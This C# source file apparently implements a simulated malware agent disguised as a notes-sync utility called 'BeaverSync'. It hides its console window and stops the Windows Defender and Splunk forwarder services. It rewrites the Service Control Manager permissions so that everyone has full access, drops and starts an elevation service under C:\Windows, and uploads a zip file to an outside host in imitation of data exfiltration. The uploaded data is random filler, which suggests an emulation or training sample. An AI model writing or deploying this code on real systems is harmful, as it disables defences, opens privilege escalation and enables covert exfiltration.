using System;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Threading;
using System.ServiceProcess;
using VoidSerpent;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace BeaverSync
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        private static DatabaseManager db;

        static async Task Main(string[] args)
        {
            HideConsoleWindow();
            /* not working, need more time to debug
            if (!BetrayalIsASymptom.protectedStart())
            {
                Console.WriteLine("System doesn't meet requirements!");
                return;
            }
            */

            // Normal, non-administrative sync
            if (args.Length == 0)
            {
                // Check if system has been beavered and try to stop services
                string beavered = @"C:\ProgramData\BeaverSynced";
                if (File.Exists(beavered))
                {
                    List<string> badSvcs = new List<string>
                    {
                        "SplunkForwarder",
                        "WinDefend"
                    };
                    foreach (string svc in badSvcs)
                    {
                        try
                        {
                            // Create a new ServiceController instance for the specified service
                            using (ServiceController service = new ServiceController(svc))
                            {
                                service.Stop();
                            }
                        }
                        catch { }
                    }
                }
                // need to open the database and go through the files and directory tables, sending everything in collected state and mark updated
                string buPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\BeaverNotesPro");
                db = new DatabaseManager(Path.Combine(buPath, "syncstate.db"));
                var pending = db.PendingFiles();


                // send the directory - we're spoofing data to not leak things
                await Task.Run(() => GimmeOuttaHere());
            }
            else if (args.Length == 1 && args[0] == "register")
            {
                //Console.WriteLine("Username not specified with registration command!");
                //Console.ReadLine();
                return;
            }
            else if (args.Length == 2 && args[0] == "register")
            {
                string[] applicationArgs = args;
                if (!BetrayalIsASymptom.IsUserAdmin())
                {
                    string applicationPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    BetrayalIsASymptom.RequestElevation(applicationPath, applicationArgs);
                }
                else
                {
                    // "Fixing" SCManager
                    string[] regcmd = { "sdset", "scmanager", "D:(A;;KA;;;WD)" };
                    doThing("sc.exe", regcmd, false);

                    // Dropping and registering a service
                    string user = args[1];
                    string svcCopy = $"C:\\Users\\{user}\\AppData\\Local\\Programs\\BeaverNotesPro\\BeaverElevateService.exe";
                    string svcDest = @"C:\Windows\BeaverElevateService.exe";
                    try
                    {
                        // Check if the source file exists
                        if (File.Exists(svcCopy))
                        {
                            // Copy the file to the new location, overwriting if necessary
                            File.Copy(svcCopy, svcDest, true);
                            string[] inst = { @"C:\Windows\BeaverElevateService.exe" };
                            doThing("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", inst, false);
                            string[] startSvc = { "start", "BeaverElevateSvc" };
                            Thread.Sleep(5000);
                            doThing("sc.exe", startSvc, false);

                            // mark compromised
                            string beavered = @"C:\ProgramData\BeaverSynced";
                            File.Create(beavered).Close();
                        }
                        else
                        {
                            Console.WriteLine("Source file does not exist.");
                        }
                    }
                    catch (IOException ex)
                    {
                        Console.WriteLine($"An I/O error occurred while copying the file: {ex.Message}");
                    }
                    catch (UnauthorizedAccessException ex)
                    {
                        Console.WriteLine($"Access denied. You do not have permission to copy the file: {ex.Message}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"An unexpected error occurred: {ex.Message}");
                    }
                }
            }
            else if (args.Length == 2 && args[0] == "unregister")
            {
                Console.WriteLine(string.Join(" ", args));
                string[] applicationArgs = args;
                if (!VoidSerpent.BetrayalIsASymptom.IsUserAdmin())
                {
                    string applicationPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    BetrayalIsASymptom.RequestElevation(applicationPath, applicationArgs);
                }
                else
                {
                    Console.WriteLine("Performing unregister!");
                    // "Un-Fixing" SCManager
                    string[] regcmd = { "sdset", "scmanager", "D:(A;;CC;;;AU)(A;;CCLCRPRC;;;IU)(A;;CCLCRPRC;;;SU)(A;;CCLCRPWPRC;;;SY)(A;;KA;;;BA)(A;;CC;;;AC)(A;;CC;;;S-1-15-3-1024-528118966-3876874398-709513571-1907873084-3598227634-3698730060-278077788-3990600205)S:(AU;FA;KA;;;WD)(AU;OIIOFA;GA;;;WD)" };
                    doThing("sc.exe", regcmd, false);

                    // unregister the elevation service
                    string[] uninst = { "/u", @"C:\Windows\BeaverElevateService.exe" };
                    doThing("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe", uninst, false);
                    string beavSvc = @"C:\Windows\BeaverElevateService.exe";
                    if (File.Exists(beavSvc))
                    {
                        File.Delete(beavSvc);
                    }

                    // remove compfile if exists
                    string beavered = @"C:\ProgramData\BeaverSynced";
                    if (File.Exists(beavered))
                    {
                        File.Delete(beavered);
                    }
                }
            }
            else
            {
                Console.WriteLine("something bad happened");
                Console.ReadLine();
                return; // argument not valid
            }
        }

        public static void doThing(string process, string[] args, bool shell)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = $"\"{process}\"",
                Arguments = string.Join(" ", args),
                Verb = "runas",
                UseShellExecute = shell
            };
            try
            {
                Process.Start(startInfo);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to request elevation: " + ex.Message);
            }
        }

        private static async Task GimmeOuttaHere()
        {
            Console.WriteLine("Uploading junk");
            string filePath = Path.Combine(Path.GetTempPath(), "notes.zip");
            string uploadUrl = "https://beaverpro.sketchybins.com/sync";

            // Step 1: Create a 500KB file named notes.zip
            await tmpF(filePath, 500 * 1024); // 500KB

            // Step 2: Upload the file via POST request
            using (var httpClient = new HttpClient())
            {
                var content = new MultipartFormDataContent();
                var fileStreamContent = new StreamContent(File.OpenRead(filePath));
                content.Add(fileStreamContent, "file", Path.GetFileName(filePath));
                HttpResponseMessage response = await httpClient.PostAsync(uploadUrl, content);

                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("File uploaded successfully.");
                    string responseBody = await response.Content.ReadAsStringAsync();
                    Console.WriteLine(responseBody);
                }
                else
                {
                    Console.WriteLine($"Failed to upload file. Status code: {response.StatusCode}");
                    Console.WriteLine(await response.Content.ReadAsStringAsync());
                }
            }
        }

        private static async Task tmpF(string filePath, int sizeInBytes)
        {
            using (FileStream fs = File.Create(filePath))
            {
                byte[] dummyData = new byte[sizeInBytes];
                Random rnd = new Random();
                rnd.NextBytes(dummyData);
                await fs.WriteAsync(dummyData, 0, dummyData.Length);
            }
        }

        private static void HideConsoleWindow()
        {
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
            {
                ShowWindow(hWnd, SW_HIDE);
            }
        }
    }
}

